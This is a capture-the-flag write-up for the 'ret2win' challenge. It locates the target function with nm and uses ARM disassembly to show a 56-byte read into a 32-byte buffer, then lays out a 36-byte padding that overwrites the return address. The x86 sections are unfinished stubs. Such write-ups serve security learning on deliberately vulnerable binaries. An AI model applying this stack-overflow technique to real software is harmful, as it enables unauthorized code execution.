# ret2win

This is the first of the 8 challenges, it's also the simplest.
All binaries have the same vulnerability which is a buffer overflow in the `pwnme` function.

For this one, we can find the ret2win function by listing symbols of the file with nm.
```
$ nm ret2win
...
0000000000400756 t ret2win  # x86_64
...
0804862c t ret2win          # x86
...
000105ec t ret2win          # ARMv5
...
```
The objective become clear: return from `pwnme` into `ret2win`.

## x86_64: (`TODO)

## x86: (TODO)

## ARM:
```asm
00010570 <pwnme>:
   10570:	e92d4800 	push	{fp, lr}
   10574:	e28db004 	add	fp, sp, #4
   10578:	e24dd020 	sub	sp, sp, #32
...
000105b0 <pwnme + 0x40>:
   105b0:	e24b3024 	sub	r3, fp, #36
   105b4:	e3a02038 	mov	r2, #56
   105b8:	e1a01003 	mov	r1, r3
   105bc:	e3a00000 	mov	r0, #0
   105c0:	ebffff80 	bl	103c8 <read@plt>
...
000105d0 <pwnme + 0x60>:
   105d0:	e24bd004 	sub	sp, fp, #4
   105d4:	e8bd8800 	pop	{fp, pc}
```
The above disassembler output tells us there is a 32 bytes buffer.   
It is overflowed by the read call, asking for 56 bytes of user input.
On the stack, right below the local buffer, are stored `fp` and `lr`.
So, by writing 36 bytes beyond the buffer, we can overwrite the value that will be popped as `pc`
```bash
┌─────────────┐  ┌─────────────┐
│             │  │ 20 20 20 20 │ <- padding (36 bytes)
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
├─────────────┤  │ 20 20 20 20 │
│ fp          │  │ 20 20 20 20 │
├─────────────┤  ├─────────────┤
│ lr          │  │ 0x105ec     │ <- ret2win address
└─────────────┘  └─────────────┘
```
